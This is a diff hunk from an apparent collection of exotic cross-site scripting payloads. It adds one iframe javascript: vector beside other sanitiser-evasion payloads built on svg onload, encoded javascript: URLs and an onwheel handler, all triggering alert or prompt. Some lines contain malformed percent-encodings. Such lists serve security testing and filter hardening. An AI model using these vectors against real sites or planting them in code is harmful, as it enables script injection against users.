@@ -10,6 +10,8 @@ I REQUEST TO CONTRIBUTE TO THE PROJECT BY INCLUDING ONLY HIGHLY EXOTIC XSS VECTO
 
 <svg onload="alert(1)" <="" svg=""
 
+<</p>iframe src=javascript:alert()//
+
 <iframe/src=j%0aa%0av%0aa%0as%0ac%0ar%0ai%0ap%0t:prompt `1`>
 
 %22%3e%3c%5K/onwheel=alert(1)%3emouse%20wheel%20here%3c%21--
